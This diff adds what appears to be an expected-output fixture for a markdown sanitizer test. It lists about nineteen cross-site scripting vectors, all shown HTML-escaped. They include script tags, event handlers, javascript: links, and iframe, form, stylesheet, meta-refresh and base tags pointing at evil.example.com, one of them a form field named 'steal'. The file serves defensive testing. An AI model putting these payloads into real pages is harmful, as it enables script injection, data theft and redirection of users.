@@ -1,0 +1,20 @@
+﻿<h1 id="xss--raw-html-vectors" data-source-line="1">XSS — raw HTML vectors</h1>
+<p data-source-line="3">&lt;img src=x onerror=alert(1)&gt;</p>
+<p data-source-line="5">&lt;IMG SRC=x ONERROR=alert(1)&gt;</p>
+<p data-source-line="7">&lt;svg onload=alert(1)&gt;</p>
+<p data-source-line="9">&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</p>
+<p data-source-line="11">&lt;script&gt;alert(1)&lt;/script&gt;</p>
+<p data-source-line="13">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</p>
+<p data-source-line="15">&lt;iframe src="https://evil.example.com"&gt;&lt;/iframe&gt;</p>
+<p data-source-line="17">&lt;object data="evil.swf"&gt;&lt;/object&gt;</p>
+<p data-source-line="19">&lt;embed src="evil.swf"&gt;</p>
+<p data-source-line="21">&lt;form action="https://evil.example.com"&gt;&lt;input type="text" name="steal"&gt;&lt;input type="submit"&gt;&lt;/form&gt;</p>
+<p data-source-line="23">&lt;a href="javascript:alert(1)"&gt;raw link&lt;/a&gt;</p>
+<p data-source-line="25">&lt;div onclick="alert(1)"&gt;click me&lt;/div&gt;</p>
+<p data-source-line="27">&lt;img src="x" onerror="alert(1)" onload="alert(2)"&gt;</p>
+<p data-source-line="29">&lt;details open ontoggle=alert(1)&gt;</p>
+<p data-source-line="31">&lt;body onload=alert(1)&gt;</p>
+<p data-source-line="33">&lt;style&gt;@import 'https://evil.example.com/x.css';&lt;/style&gt;</p>
+<p data-source-line="35">&lt;link rel="stylesheet" href="https://evil.example.com/x.css"&gt;</p>
+<p data-source-line="37">&lt;meta http-equiv="refresh" content="0;url=https://evil.example.com"&gt;</p>
+<p data-source-line="39">&lt;base href="https://evil.example.com/"&gt;</p>
